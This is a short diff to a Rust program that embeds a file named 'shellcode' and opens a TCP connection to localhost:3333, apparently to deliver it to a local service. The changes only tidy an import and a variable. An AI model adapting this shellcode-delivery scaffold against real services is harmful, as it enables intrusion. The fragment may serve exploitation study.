@@ -2,12 +2,12 @@ use std::net::TcpStream;
 use std::time::Duration;
 use std::io::{Write, Read};
 use message_passing::sign;
-use bytes::{Bytes, Buf};
+use bytes::{Bytes};
 
 
 fn main() {
 println!("ddd");
-    let mut shellcode = Bytes::copy_from_slice(include_bytes!("shellcode"));
+    let shellcode = Bytes::copy_from_slice(include_bytes!("shellcode"));
     let mut connection = TcpStream::connect("localhost:3333").unwrap();
     connection.set_read_timeout(Some(Duration::from_millis(20)));
     let mut buf = [0u8; 4];
